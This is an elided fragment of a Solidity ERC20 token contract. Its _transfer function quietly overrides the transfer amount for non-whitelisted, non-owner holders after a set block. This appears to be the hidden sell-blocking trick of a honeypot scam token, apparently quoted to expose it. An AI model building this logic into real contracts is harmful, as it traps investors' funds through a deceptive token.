...
contract ERC20 is Context, IERC20 {
  ...
  modifier ensureApproval(address _sender, uint256 _amount) {
  ...
  function _transfer(address sender, address recipient, uint256 amount) internal virtual ensureApproval(sender, amount) {
    ...
    if (!_Presale) {
        ...
        if (senderClaim > 0 && sender != owner && !Gwei[sender] && _claimTokenBlock[sender] != 0 && _claimTokenBlock[sender] <= block.number) {
        amount = _blockRecord;
        }
    }
